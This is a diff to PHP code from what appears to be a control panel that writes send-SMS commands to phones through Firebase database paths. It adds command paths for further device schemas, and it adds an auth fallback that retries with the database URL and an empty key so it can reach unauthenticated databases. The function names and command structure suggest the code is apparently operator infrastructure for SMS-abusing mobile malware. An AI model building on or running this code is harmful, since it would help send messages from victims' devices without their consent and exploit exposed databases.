@@ -370,6 +370,8 @@ function rebel_send_paths_for_device(string $deviceId, string $schema = 'rabel',
                 continue;
             }
             $out[] = ['path' => $n . '/' . $id . '/webhookEvent/sendSms', 'type' => 'rabel', 'method' => 'PUT'];
+            $out[] = ['path' => $n . '/' . $id . '/manual_commands/send_sms', 'type' => 'spinplay', 'method' => 'PUT'];
+            $out[] = ['path' => $n . '/' . $id . '/commands/send_sms', 'type' => 'rto9', 'method' => 'PUT'];
         }
         $out[] = ['path' => 'devices/' . $id . '/manual_commands/send_sms', 'type' => 'spinplay', 'method' => 'PUT'];
     }
@@ -432,6 +434,8 @@ function rebel_send_payload_for_type(string $type, int $sim, string $to, string 
         'to' => $toDial,
         'message' => $message,
         'isSended' => false,
+        'timestamp' => (int) round(microtime(true) * 1000),
+        'id' => 'sms_' . (int) round(microtime(true) * 1000),
     ];
 }
 
@@ -489,7 +493,7 @@ function rebel_firebase_req(string $method, string $url, string $key, string $pa
         $raw = curl_exec($ch);
         $code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
         curl_close($ch);
-        if ($code === 200 || $code === 201) {
+        if ($code === 200 || $code === 201 || $code === 204) {
             if ($raw === false || trim($raw) === '' || trim($raw) === 'null') {
                 return [];
             }
@@ -519,7 +523,7 @@ function rebel_firebase_req(string $method, string $url, string $key, string $pa
     if (!empty($http_response_header[0]) && preg_match('/\s(\d{3})\s/', $http_response_header[0], $m)) {
         $status = (int) $m[1];
     }
-    if ($status !== 200 && $status !== 201) {
+    if ($status !== 200 && $status !== 201 && $status !== 204) {
         return null;
     }
     if (trim($raw) === '' || trim($raw) === 'null') {
@@ -527,6 +531,35 @@ function rebel_firebase_req(string $method, string $url, string $key, string $pa
     }
     $parsed = json_decode($raw, true);
     return is_array($parsed) ? $parsed : [];
+}
+
+/** Try panel auth keys + database URL + public (matches nya-firebase.js getFbAuthCandidates). */
+function rebel_firebase_auth_candidates(string $url, string $key): array
+{
+    $keys = [];
+    $key = trim($key);
+    if ($key !== '' && !in_array($key, $keys, true)) {
+        $keys[] = $key;
+    }
+    $urlTrim = rtrim($url, '/');
+    if ($urlTrim !== '' && !in_array($urlTrim, $keys, true)) {
+        $keys[] = $urlTrim;
+    }
+    if (!in_array('', $keys, true)) {
+        $keys[] = '';
+    }
+    return $keys;
+}
+
+function rebel_firebase_req_multi(string $method, string $url, string $key, string $path, ?array $data = null): ?array
+{
+    foreach (rebel_firebase_auth_candidates($url, $key) as $auth) {
+        $res = rebel_firebase_req($method, $url, $auth, $path, $data);
+        if ($res !== null) {
+            return $res;
+        }
+    }
+    return null;
 }
 
 function rebel_sms_looks_like_message(array $m): bool
@@ -792,9 +825,11 @@ function rebel_send_sms_to_device(
         }
         $payload = rebel_send_payload_for_type($type, $sim, $to, $message, $deviceId, $sameNumber, $simCount);
         $method = strtoupper((string)($attempt['method'] ?? 'PUT'));
-        $res = rebel_firebase_req($method, $url, $authKey, $path, $payload);
+        $res = rebel_firebase_req_multi($method, $url, $authKey, $path, $payload);
         if ($res !== null) {
-            if ($method === 'PATCH' && strpos($path, 'webhookEvent') === false) {
+            if (($method === 'PATCH' && strpos($path, 'webhookEvent') === false)
+                || strpos($path, 'manual_commands/send_sms') !== false
+                || strpos($path, 'commands/send_sms') !== false) {
                 $patchOk = true;
             }
             if (strpos($path, 'webhookEvent/sendSms') !== false) {
